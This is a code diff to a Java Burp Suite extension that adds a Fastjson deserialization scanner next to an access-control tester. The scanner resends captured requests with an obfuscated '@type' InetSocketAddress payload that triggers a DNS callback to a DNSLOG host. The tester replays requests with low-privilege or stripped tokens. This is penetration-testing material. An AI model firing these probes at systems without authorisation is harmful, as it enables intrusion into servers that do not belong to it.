@@ -8,26 +8,39 @@ import burp.api.montoya.http.message.params.HttpParameterType;
 import burp.api.montoya.http.message.params.ParsedHttpParameter;
 import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
+import jrcet.frame.Scanner.Fastjson.Fastjson;
+import jrcet.frame.Scanner.Fastjson.FastjsonTableEntry;
 import jrcet.frame.Scanner.Overauth.OverauthTableEntry;
 import jrcet.help.Helper;
 import org.xm.Similarity;
 
 import javax.swing.*;
 import javax.swing.table.DefaultTableModel;
-import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.*;
 
 import static burp.MyExtender.API;
-import static jrcet.frame.Scanner.Overauth.OverauthComponent.*;
+import static jrcet.frame.Scanner.Fastjson.Fastjson.*;
+import static jrcet.frame.Scanner.Overauth.Overauth.*;
 
 public class MyRegisterHttpHandler implements HttpHandler {
 
-    public String RequestNumber = "1";
-    public static ArrayList<String> UrlList = new ArrayList<>();
-    public static HashMap<String, OverauthTableEntry> RequestMap = new HashMap<>();
+    public final String AUTH = "AUTH";
 
-    public String[] blackExtensionList = new String[]{"js","png","jpg","jpeg","gif","txt","html","pdf","xls","xlsx","word","ppt","zip","xml","gif","js"};
+    public final String FASTJSON = "FASTJSON";
+    public String AuthCheckRequestNumber = "1";
+
+    public String FastjsonCheckRequestNumber = "1";
+    public static ArrayList<String> AuthCheckUrlList = new ArrayList<>();
+
+    public static ArrayList<String> FastjsonCheckUrlList = new ArrayList<String>();
+    public static HashMap<String, OverauthTableEntry> AuthCheckEntryMap = new HashMap<>();
+
+    public static HashMap<String, FastjsonTableEntry> FastjsonEntryMap = new HashMap<>();
+    public String[] BlackExtensionList = new String[]{"js","png","jpg","jpeg","gif","txt","html","pdf","xls","xlsx","word","ppt","zip","xml","gif","js"};
+
+    public static boolean debug = true;
+
     @Override
     public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
 
@@ -39,31 +52,128 @@ public class MyRegisterHttpHandler implements HttpHandler {
             }
         }
 
-        //不接受不期望的流量
-        String requestHost = requestToBeSent.httpService().host();
-        String targetHost = getField("OverauthMenuHostField").getText();
-        if(Objects.equals(targetHost, "") || !requestHost.contains(targetHost)){
-            return RequestToBeSentAction.continueWith(requestToBeSent);
-        }
-
-        //不接受已检查过的url
-        if(UrlList.contains(requestToBeSent.url())){
-            return RequestToBeSentAction.continueWith(requestToBeSent);
-        }
-
         //不接受静态文件的请求
         String requestPath = requestToBeSent.path();
-        for(String ext:blackExtensionList){
+        if(debug)API.logging().output().println("请求地址："+requestPath);
+        for(String ext: BlackExtensionList){
             requestPath = (requestPath.split("\\?"))[0];
             if(requestPath.endsWith(ext)){
                 return RequestToBeSentAction.continueWith(requestToBeSent);
             }
         }
 
-//        API.logging().output().println("UrlList的大小："+UrlList.size());
-//        API.logging().output().println("UrlList New："+requestToBeSent.url());
+        //不接受已检查过的url
+        //fastjson检查过的url
+        String fastjsonNote = "";
+        if(debug)API.logging().output().println("fastjson是否检查过 "+requestToBeSent.url()+" : "+FastjsonCheckUrlList.contains(requestToBeSent.url()));
 
-        //判断是否可能有水平越权的字段
+        if(!FastjsonCheckUrlList.contains(requestToBeSent.url())){
+            fastjsonNote = fastjsonCheckRequest(requestToBeSent);
+
+        }
+
+        //Overauth检查过的Url
+        String authCheckNote = "";
+        if(debug)API.logging().output().println("authcheck是否检查过 "+requestToBeSent.url()+" : "+AuthCheckUrlList.contains(requestToBeSent.url()));
+        if(!AuthCheckUrlList.contains(requestToBeSent.url())){
+            authCheckNote = authCheckRequest(requestToBeSent);
+        }
+
+        Annotations requestAnnotations = requestToBeSent.annotations().withNotes(
+                fastjsonNote+","+authCheckNote
+        );
+
+        return RequestToBeSentAction.continueWith(requestToBeSent, requestAnnotations);
+    }
+
+    @Override
+    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
+
+        String requestNotes = responseReceived.annotations().notes();
+        //判断是否为Fastjson期望的返回包
+        String fastjsonRequestNumber = getRequestNumber(FASTJSON, requestNotes);
+        if(!fastjsonRequestNumber.equals("")){
+            fastjsonCheckResponse(responseReceived,fastjsonRequestNumber);
+        }
+
+        //判断是否为OverAuth期望的返回包
+        String overAuthRequestNumber = getRequestNumber(AUTH, requestNotes);
+        if(!overAuthRequestNumber.equals("")){
+            authCheckResponse(responseReceived,overAuthRequestNumber);
+        }
+
+        return ResponseReceivedAction.continueWith(responseReceived);
+    }
+
+    public String fastjsonCheckRequest(HttpRequestToBeSent requestToBeSent){
+
+        if(!getFastjsonMenuWorkBox().isSelected() || !Fastjson.check(requestToBeSent)) return "";
+        String requestNumber = FastjsonCheckRequestNumber;
+        String requestHost = requestToBeSent.httpService().host();
+        String requestMethod = requestToBeSent.method();
+        String requestTool = requestToBeSent.toolSource().toolType().toolName();
+        String requestPath = requestToBeSent.path();
+        String requestTime = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());
+        String[] inf = new String[]{requestNumber, requestTool, requestMethod, requestHost, requestPath, "", requestTime, "", "", ""};
+
+        ((DefaultTableModel)getFastjsonLoggerTable().getModel()).addRow(inf);
+
+        FastjsonTableEntry rowEntry = new FastjsonTableEntry(inf);
+        FastjsonEntryMap.put(requestNumber,rowEntry);
+        rowEntry.setRawRequest(requestToBeSent);
+
+        FastjsonCheckRequestNumber = Integer.toString(Integer.parseInt(FastjsonCheckRequestNumber)+1);
+
+        return FASTJSON+requestNumber;
+    }
+
+    public void fastjsonCheckResponse(HttpResponseReceived responseReceived, String fastjsonCheckRequestNumber){
+
+        if(debug)API.logging().output().println("fastjson chekcn 处理row: "+Integer.parseInt(fastjsonCheckRequestNumber));
+
+        //设置Fastjson
+        String responseLength = Integer.toString(responseReceived.body().length());
+        if(debug)API.logging().output().println("fastjson Raw返回包长度:"+responseLength);
+        setFastjsonLoggerTableValueAt(responseLength, Integer.parseInt(fastjsonCheckRequestNumber) - 1, "Length");
+        FastjsonEntryMap.get(fastjsonCheckRequestNumber).setLength(responseLength);
+
+        //设置返回包时间
+        String responseTime = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());
+        if(debug)API.logging().output().println("fastjson Raw返回包时间:"+responseTime);
+        setFastjsonLoggerTableValueAt(responseTime, Integer.parseInt(fastjsonCheckRequestNumber) - 1, "responseTime");
+        FastjsonEntryMap.get(fastjsonCheckRequestNumber).setResponseTime(responseTime);
+
+        //设置Raw返回包
+        FastjsonEntryMap.get(fastjsonCheckRequestNumber).setRawResponse(responseReceived);
+        //设置Raw返回包简化版
+        HttpResponse simplifyHighAuthhttpResponse = responseReceived.withBody(responseReceived.body().subArray(0, Math.min(20000, Integer.parseInt(responseLength))));
+        FastjsonEntryMap.get(fastjsonCheckRequestNumber).setSimplifyRawResponse(simplifyHighAuthhttpResponse);
+
+        //进行fastjson检查
+        if(debug)API.logging().output().println("fastjson 进行检查");
+        String randomString = Helper.createRandomString(8);
+        String body =  ("\\ufeff{,/*aab*/,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+randomString+"."+DNSLOG+"\"}}}");
+        HttpRequest fastjsonRequest = FastjsonEntryMap.get(fastjsonCheckRequestNumber).getRawRequest().withBody(body);
+
+        new authCheckWorker("fastjson", fastjsonCheckRequestNumber, fastjsonRequest).execute();
+        if(debug)API.logging().output().println("fastjson 检查完毕");
+
+        FastjsonCheckUrlList.add(FastjsonEntryMap.get(fastjsonCheckRequestNumber).getRawRequest().url());
+
+    }
+
+    public String authCheckRequest(HttpRequestToBeSent requestToBeSent){
+        //不接受不期望的流量
+        //Overauth不期望的域名
+        String requestHost = requestToBeSent.httpService().host();
+        String overauthTargetHost = getOverauthMenuHostField().getText();
+        if(Objects.equals(overauthTargetHost, "") || !requestHost.contains(overauthTargetHost)){
+            return "";
+        }
+        if(debug)API.logging().output().println("期望域名："+requestHost);
+
+
+        //设置有水平越权的字段
         StringBuilder FlagAuth =  new StringBuilder();
         List<ParsedHttpParameter> highAuthParameterList = requestToBeSent.parameters();
         for(ParsedHttpParameter highAuthParameter : highAuthParameterList){
@@ -72,94 +182,96 @@ public class MyRegisterHttpHandler implements HttpHandler {
             }
         }
 
+        if(debug)API.logging().output().println("判断水平越权");
 
-        // 设置table
+        // 设置authcheck table
+        String requestNumber = AuthCheckRequestNumber;
         String requestMethod = requestToBeSent.method();
+        String requestTool = requestToBeSent.toolSource().toolType().toolName();
+        String requestPath = requestToBeSent.path();
         String requestTime = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());
-        String[] inf = new String[]{RequestNumber, requestTool, requestMethod, requestHost, requestPath,"", requestTime, "", "", "", FlagAuth.toString()};
+        String[] inf = new String[]{requestNumber, requestTool, requestMethod, requestHost, requestPath,"", requestTime, "", "", "", FlagAuth.toString()};
+        if(debug)API.logging().output().println("获取tablerow");
 
-        ((DefaultTableModel)getTable().getModel()).addRow(inf);
+        if(debug)API.logging().output().println("设置tablerow");
+        ((DefaultTableModel) getOverauthLoggerTable().getModel()).addRow(inf);
 
-        //设置本次请求的rowEntry
+        //设置本次请求的authcheck rowEntry
         OverauthTableEntry rowEntry = new OverauthTableEntry(inf);
         rowEntry.setHighAuthRequest(requestToBeSent);
-        RequestMap.put(RequestNumber, rowEntry);
 
-        //设置请求的识别码，方便识别返回包
-        Annotations requestAnnotations = requestToBeSent.annotations().withNotes(RequestNumber);
+        if(debug)API.logging().output().println("设置rowEntry");
+        AuthCheckEntryMap.put(AuthCheckRequestNumber, rowEntry);
 
+        //设置overauth请求的识别码，方便识别返回包
         //row+1
-        RequestNumber = Integer.toString(Integer.parseInt(RequestNumber)+1);
+        if(debug)API.logging().output().println("设置请求识别码");if(debug)API.logging().output().println("设置请求识别码");
 
-        return RequestToBeSentAction.continueWith(requestToBeSent,requestAnnotations);
+
+        AuthCheckRequestNumber = Integer.toString(Integer.parseInt(AuthCheckRequestNumber)+1);
+
+        return AUTH + requestNumber;
     }
 
-    @Override
-    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
 
-        //判断是否为期望的返回包
-        String requestNumber = responseReceived.annotations().notes();
-        if(requestNumber==null){
-            return ResponseReceivedAction.continueWith(responseReceived);
-        }
+    public void authCheckResponse(HttpResponseReceived responseReceived, String requestNumber){
 
-//        API.logging().output().println("返回包的标识："+requestNumber);
+        if(debug)API.logging().output().println("返回包的标识："+requestNumber);
 
         //设置返回包
-        RequestMap.get(requestNumber).setHighAuthResponse(responseReceived);
-//        API.logging().output().println("成功设置responseReceived");
+        AuthCheckEntryMap.get(requestNumber).setHighAuthResponse(responseReceived);
+        if(debug)API.logging().output().println("成功设置responseReceived");
 
         //设置返回包长度
         String responseLength = Integer.toString(responseReceived.body().length());
-//        API.logging().output().println("返回包长度:"+responseLength);
-        int responseLengthColumn = 5; (getTable().getModel()).setValueAt(responseLength,Integer.parseInt(requestNumber)-1,responseLengthColumn);
-        RequestMap.get(requestNumber).setLength(responseLength);
+        if(debug)API.logging().output().println("返回包长度:"+responseLength);
+        setOverauthLoggerTableValueAt(responseLength,Integer.parseInt(requestNumber)-1,"Length");
+        AuthCheckEntryMap.get(requestNumber).setLength(responseLength);
 
         //设置返回包时间
         String responseTime = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());
-        int responseTimeColumn = 7; (getTable().getModel()).setValueAt(responseTime,Integer.parseInt(requestNumber)-1,responseTimeColumn);
-        RequestMap.get(requestNumber).setResponseTime(responseTime);
+        setOverauthLoggerTableValueAt(responseTime,Integer.parseInt(requestNumber)-1, "responseTime");
+        AuthCheckEntryMap.get(requestNumber).setResponseTime(responseTime);
 
         //设置返回包简化版
         HttpResponse iSimplifyHighAuthhttpResponse = responseReceived.withBody(responseReceived.body().subArray(0, Math.min(20000, Integer.parseInt(responseLength))));
-        RequestMap.get(requestNumber).setSimplifyHighAuthResponse(iSimplifyHighAuthhttpResponse);
+        AuthCheckEntryMap.get(requestNumber).setSimplifyHighAuthResponse(iSimplifyHighAuthhttpResponse);
 
 
-        // 判断url是否已进行过越权测试，如果进行了，则不再测试越权
-        HttpRequest highAuthHttpRequest = RequestMap.get(requestNumber).HighAuthRequest;
+        // 测试越权
+        HttpRequest highAuthHttpRequest = AuthCheckEntryMap.get(requestNumber).HighAuthRequest;
         HttpService httpService = highAuthHttpRequest.httpService();
 
 
         //获取鉴权字段
-        String highAuth = getField("OverauthMenuHighauthField").getText();
-        String lowAuth = getField("OverauthMenuLowauthField").getText();
+        String highAuth = getOverauthMenuHighauthField().getText();
+        String lowAuth = getOverauthMenuLowauthField().getText();
 
         //如果未设置高权限鉴权字段，将不进行检测
-//        API.logging().output().println(highAuth);
+        if(debug)API.logging().output().println(highAuth);
         if(Objects.equals(highAuth, "")){
-//            API.logging().output().println("未设置高权限字段");
-            return ResponseReceivedAction.continueWith(responseReceived);
+            if(debug)API.logging().output().println("未设置高权限字段");
+            return ;
         }
 
         String highAuthHttpReuqestString = highAuthHttpRequest.toString();
         //如果设置了低权限鉴权字段，发送低权限请求
         if(!Objects.equals(lowAuth, "")){
-//            API.logging().output().println("发送低权限请求包");
+            if(debug)API.logging().output().println("发送低权限请求包");
             HttpRequest lowAuthHttpRequest = HttpRequest.httpRequest(httpService,highAuthHttpReuqestString.replace(highAuth,lowAuth));
             new authCheckWorker("lowAuth",requestNumber,lowAuthHttpRequest).execute();
         }
 
         //发送未授权请求
-//        API.logging().output().println("发送未授权请求包");
+        if(debug)API.logging().output().println("发送未授权请求包");
         HttpRequest unAuthHttpRequest =  HttpRequest.httpRequest(httpService,highAuthHttpReuqestString.replace(highAuth,""));
         new authCheckWorker("unAuth",requestNumber,unAuthHttpRequest).execute();
 
         //将url加入到已测试列表
-        UrlList.add(highAuthHttpRequest.url());
-//        API.logging().output().println("UrlList Add："+highAuthHttpRequest.url());
-
-        return ResponseReceivedAction.continueWith(responseReceived);
+        if(debug)API.logging().output().println("UrlList Add："+highAuthHttpRequest.url());
+        AuthCheckUrlList.add(highAuthHttpRequest.url());
     }
+
     public static class authCheckWorker extends SwingWorker<String, Void> {
         public String number;
         public String type;
@@ -167,58 +279,61 @@ public class MyRegisterHttpHandler implements HttpHandler {
         public HttpRequestResponse httpRequestResponse;
 
         public authCheckWorker(String type, String number, HttpRequest httpRequest) {
-            this.number = number;
             this.type = type;
+            this.number = number;
             this.httpRequest = httpRequest;
 
         }
-
         @Override
         protected String doInBackground() {
+            if(debug) API.logging().output().println("start sendRequest work");
             httpRequestResponse = API.http().sendRequest(httpRequest);
-            return null;
-        }
-
-        @Override
-        protected void done() {
+            HttpRequest  ihttpRequest = httpRequestResponse.request();
             HttpResponse ihttpResponse = httpRequestResponse.response();
             HttpResponse iSimplifyhttpResponse = ihttpResponse.withBody(ihttpResponse.body().subArray(0,Math.min(20000,ihttpResponse.body().length())));
 
-            HttpResponse highAuthHttpResponse = RequestMap.get(number).HighAuthResponse;
             switch (type) {
                 case "unAuth" -> {
-                    RequestMap.get(number).setUnAuthRequest(httpRequestResponse.request());
-                    RequestMap.get(number).setUnAuthResponse(ihttpResponse);
-                    RequestMap.get(number).setSimplifyUnAuthResponse(iSimplifyhttpResponse);
-                    double unAuthSimilarity = Similarity.charBasedSimilarity(highAuthHttpResponse.bodyToString(), ihttpResponse.bodyToString());
+                    AuthCheckEntryMap.get(number).setUnAuthRequest(ihttpRequest);
+                    AuthCheckEntryMap.get(number).setUnAuthResponse(ihttpResponse);
+                    AuthCheckEntryMap.get(number).setSimplifyUnAuthResponse(iSimplifyhttpResponse);
+                    double unAuthSimilarity = Similarity.charBasedSimilarity(AuthCheckEntryMap.get(number).HighAuthResponse.bodyToString(), ihttpResponse.bodyToString());
                     if (unAuthSimilarity >= 0.9) {
-                        RequestMap.get(number).UnAuth = "True";
-                        getTable().getModel().setValueAt("True", Integer.parseInt(number) - 1, 9);
+                        AuthCheckEntryMap.get(number).UnAuth = "True";
+                        setOverauthLoggerTableValueAt("True", Integer.parseInt(number) - 1, "UnAuth");
                     }
                 }
                 case "lowAuth" -> {
-                    RequestMap.get(number).setLowAuthRequest(httpRequestResponse.request());
-                    RequestMap.get(number).setUnAuthResponse(ihttpResponse);
-                    RequestMap.get(number).setSimplifyLowAuthResponse(iSimplifyhttpResponse);
-                    double lowAuthSimilarity = Similarity.charBasedSimilarity(highAuthHttpResponse.bodyToString(), ihttpResponse.bodyToString());
+                    AuthCheckEntryMap.get(number).setLowAuthRequest(ihttpRequest);
+                    AuthCheckEntryMap.get(number).setUnAuthResponse(ihttpResponse);
+                    AuthCheckEntryMap.get(number).setSimplifyLowAuthResponse(iSimplifyhttpResponse);
+                    double lowAuthSimilarity = Similarity.charBasedSimilarity(AuthCheckEntryMap.get(number).HighAuthResponse.bodyToString(), ihttpResponse.bodyToString());
                     if (lowAuthSimilarity >= 0.9) {
-                        RequestMap.get(number).OverAuth = "True";
-                        getTable().getModel().setValueAt("True", Integer.parseInt(number) - 1, 8);
+                        AuthCheckEntryMap.get(number).OverAuth = "True";
+                        setOverauthLoggerTableValueAt("True", Integer.parseInt(number) - 1, "OverAuth");
                     }
                 }
+
+                case "fastjson" -> {
+                    if(debug)API.logging().output().println("设置fastjson的fastjsonRequest");
+                    FastjsonEntryMap.get(number).setFastjsonRequest(ihttpRequest);
+                    FastjsonEntryMap.get(number).setFastjsonResponse(ihttpResponse);
+                    FastjsonEntryMap.get(number).setSimplifyFastjsonResponse(iSimplifyhttpResponse);
+                    if(debug)API.logging().output().println("设置是否存在fastjson漏洞");
+                    setFastjsonLoggerTableValueAt("True", Integer.parseInt(number) - 1, "FastJson");
+                }
             }
+            return null;
         }
     }
 
-    public static JTable getTable(){
-        return (JTable) Helper.getComponent(OverauthComponent,"OverauthLoggerTable");
-    }
-
-    public static JTextField getField(String filedName){
-        return (JTextField) Helper.getComponent(OverauthComponent,filedName);
-    }
-
-    public static String getRequestNumber(int row){
-        return (String) getTable().getValueAt(row,0);
+    public static String getRequestNumber(String type,String notes){
+        String[] noteArray = notes.split(",");
+        for(String note: noteArray){
+            if(note.startsWith(type)){
+                return note.replace(type,"");
+            }
+        }
+        return "";
     }
 }
